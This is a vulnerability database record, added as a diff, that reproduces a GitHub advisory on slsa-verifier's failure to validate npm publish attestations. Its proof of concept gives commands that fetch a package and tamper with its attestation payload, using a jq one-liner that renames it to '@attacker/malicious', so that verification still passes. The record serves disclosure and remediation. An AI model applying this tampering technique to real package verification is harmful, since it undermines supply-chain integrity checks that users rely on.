@@ -1,0 +1,88 @@
+vulnerability_id: VCID-t1kj-tcf3-aaad
+aliases:
+  - GHSA-r2xv-vpr2-42m9
+summary: |
+  slsa-verifier vulnerable to mproper validation of npm's publish attestations
+  ### Summary
+
+  `slsa-verifier<=2.4.0` does not correctly verify npm's [publish](https://github.com/npm/attestation/tree/main/specs/publish/v0.1) attestations signature.
+
+  ### Proof of concept
+
+  Steps to reproduce:
+  1. `curl -Sso attestations.json $(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.attestations.url')`
+  2. `curl -Sso supreme-goggles.tgz "$(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.tarball')"`
+  3. In `attestations.json`, take the value addressed by the `jq` selector `.attestations[0].bundle.dsseEnvelope.payload`, base64decode it, tamper with it, base64encode that, and replace the original value with that. Save the file as `attestations_tampered.json`.
+     Here is an example command to replace the package name with `@attacker/malicious`:
+     `jq -r ".attestations[0].bundle.dsseEnvelope.payload = \"$(jq -r '.attestations[0].bundle.dsseEnvelope.payload | @base64d' < attestations.json | jq '.subject[0].name = "pkg:npm/%40attacker/malicious"' | base64 -w0)\"" < attestations.json > attestations_tampered.json`
+  5. `SLSA_VERIFIER_EXPERIMENTAL=1 slsa-verifier verify-npm-package supreme-goggles.tgz --attestations-path attestations_tampered.json --builder-id "https://github.com/actions/runner/github-hosted" --package-name "@trishankatdatadog/supreme-goggles" --package-version 1.0.5 --source-uri github.com/trishankatdatadog/supreme-goggles`
+  6. The result is that `slsa-verifier` fails to detect this tampering of the publish attestation (unlike with the provenance attestation) and returns `PASSED`.
+
+  ### Impact
+
+  An attacker who controls what packages and attestations are shown to a user _can_ associate a package with an arbitrary name and version that do _not_ match what the user expects from the publish attestation. Furthermore, the package digest in the publish attestation need _not_ match its counterpart in the provenance attestation. However, the attacker _cannot_ associate the given package with an arbitrary source and builder that the user does not expect from the provenance attestation. Thus, the attacker could, for example, convince package managers to install authentic but older versions of packages that contain known, exploitable vulnerabilities.
+
+  Severity is considered low because 1) it does not invalidate the provenance and 2) support for npm is currently experimental.
+
+  ### Patches
+
+  Fixed by PR [#705](https://github.com/slsa-framework/slsa-verifier/pull/705) and released in versions `>=2.4.1`.
+
+  ### Workarounds
+
+  There is no easy way for users to fix or remediate this vulnerability without upgrading, short of verifying npm's publish attestations themselves, _and_ cross-verifying it against GHA's provenance attestations.
+
+  ### References
+
+  * [Original OpenSSF Slack thread](https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179)
+severities:
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/npm/attestation/tree/main/specs/publish/v0.1
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/slsa-framework/slsa-verifier
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/slsa-framework/slsa-verifier/commit/f6ae402f458b347d2c414f1d053fc1f8257888d0
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/slsa-framework/slsa-verifier/pull/705
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/slsa-framework/slsa-verifier/security/advisories/GHSA-r2xv-vpr2-42m9
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179
+weaknesses: []
+references:
+  - url: https://github.com/npm/attestation/tree/main/specs/publish/v0.1
+    reference_type:
+    reference_id:
+  - url: https://github.com/slsa-framework/slsa-verifier
+    reference_type:
+    reference_id:
+  - url: https://github.com/slsa-framework/slsa-verifier/commit/f6ae402f458b347d2c414f1d053fc1f8257888d0
+    reference_type:
+    reference_id:
+  - url: https://github.com/slsa-framework/slsa-verifier/pull/705
+    reference_type:
+    reference_id:
+  - url: https://github.com/slsa-framework/slsa-verifier/security/advisories/GHSA-r2xv-vpr2-42m9
+    reference_type:
+    reference_id:
+  - url: https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179
+    reference_type:
+    reference_id:
